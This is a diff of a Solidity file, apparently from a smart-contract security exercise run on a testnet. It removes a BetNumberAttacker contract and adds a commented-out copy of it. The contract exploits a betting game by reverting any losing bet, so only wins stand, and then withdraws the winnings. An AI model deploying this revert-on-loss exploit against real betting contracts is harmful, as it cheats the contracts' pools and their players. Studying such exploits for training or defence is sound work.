@@ -5,26 +5,42 @@ interface BetNumberInterface {
     function betNumber(uint256 bet) payable external returns (bool);
 }
 
-contract BetNumberAttacker {
-    constructor() payable {
-    }
-
-    receive() external payable {
-    }
-
-    function cheatBetNumber(address betNumberAddress) external {
-        uint256 pool = address(this).balance;
-        // play a game
-        BetNumberInterface b = BetNumberInterface(betNumberAddress);
-        b.betNumber{value: 1}(50);
-        // require win the game
-        require(address(this).balance >= pool, "lose the game");
-    }
-
-    function withdraw() external {
-        payable(msg.sender).transfer(address(this).balance);
-    }
+contract BetNumberAttacker {  
 }
+
+
+// interface BetNumberInterface {
+//     function betNumber(uint256 bet) payable external returns (bool);
+// }
+
+// contract BetNumberAttacker {  
+// }
+
+
+// interface BetNumberInterface {
+//     function betNumber(uint256 bet) payable external returns (bool);
+// }
+
+// contract BetNumberAttacker {
+//     constructor() payable {
+//     }
+
+//     receive() external payable {
+//     }
+
+//     function cheatBetNumber(address betNumberAddress) external {
+//         uint256 pool = address(this).balance;
+//         // play a game
+//         BetNumberInterface b = BetNumberInterface(betNumberAddress);
+//         b.betNumber{value: 1}(50);
+//         // require win the game
+//         require(address(this).balance >= pool, "lose the game");
+//     }
+
+//     function withdraw() external {
+//         payable(msg.sender).transfer(address(this).balance);
+//     }
+// }
 
 // Command: 
 // yarn hardhat console --network thunder-testnet
